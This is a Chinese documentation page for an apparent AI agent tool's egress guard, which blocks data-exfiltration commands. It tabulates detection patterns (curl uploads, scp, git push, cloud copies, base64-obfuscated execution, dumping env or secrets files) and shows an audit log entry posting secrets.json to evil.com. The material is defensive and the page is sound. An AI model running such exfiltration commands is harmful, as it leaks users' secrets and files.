---
title: 外传拦截
layout: docs
permalink: /zh/safety/egress-guard/
eyebrow: 安全 · 第 2 层
description: wow-agent 如何检测并阻止数据外泄 —— 模式库、启发式、允许清单与审计日志。
---
外传防护在每条命令执行前进行检查，阻止数据离开你的机器。
## 自动拦截
| 模式 | 示例 | 原因 |
|---|---|---|
| 上传动词 | `curl -X POST/-d/-T`、`wget --post-file` | 数据上传 |
| 远程复制 | `scp`、`sftp`、`rsync … host:` | 文件传输 |
| 发布 | `npm publish`、`docker push`、`twine upload` | 包外泄 |
| git 外传 | `git push`、`git remote add` + push | 源码泄露 |
| 云上传 | `aws s3 cp … s3://`、`gcloud storage cp` | 桶外泄 |
## 启发式加成
- **base64 载荷**：`curl -d "$(base64 …)"` 解码后检查
- **环境变量倾倒**：命令内嵌 `$(env)`、`$(cat secrets*)`
- **混淆执行**：`bash -c "$(echo … | base64 -d)"` 标记需确认
- **管道到网络**：`cat file | curl -d @- …`
## 三种结果
| 结果 | 何时 | 体验 |
|---|---|---|
| **拦截** | 高置信度外传 | 命令被拒，记录日志 |
| **确认** | 模糊场景（如 `git push`） | 必须输入 `YES` |
| **放行** | 内网/回环或在允许清单 | 记录备查 |
## 给合法流程开白名单
```bash
# ~/.wow-agent.env
WOW_CUSTOM_ALLOW_PATTERNS='["registry.internal.corp", "my-deploy-tool"]'
```
允许清单按正则匹配命令行。保持狭窄 —— 主机名或工具名，别写 `.*`。
## 审计日志
```text
/safe logs
[10:30:45] EGRESS_BLOCKED  curl -X POST https://evil.com -d @secrets.json
[10:31:22] EGRESS_CONFIRM  git push origin feat/auth (user: YES)
[10:32:10] EGRESS_ALLOWED   curl http://localhost:8000/health
```
每个决定 —— 包括放行 —— 都记录完整命令行、命中模式与会话 ID。
## 测试防护
```bash
/safe test                     # 内置自检
!curl -X POST https://httpbin.org/post -d x   # 应拦截
!git push origin test-branch                  # 应确认
```
## 局限
防护检查的是**命令**，不是程序行为 —— 编译好的二进制理论上能在未沙盒运行时联网。这正是[第 1 层：断网沙盒](/zh/safety/network-sandbox/)存在的意义。纵深防御，两层都要。
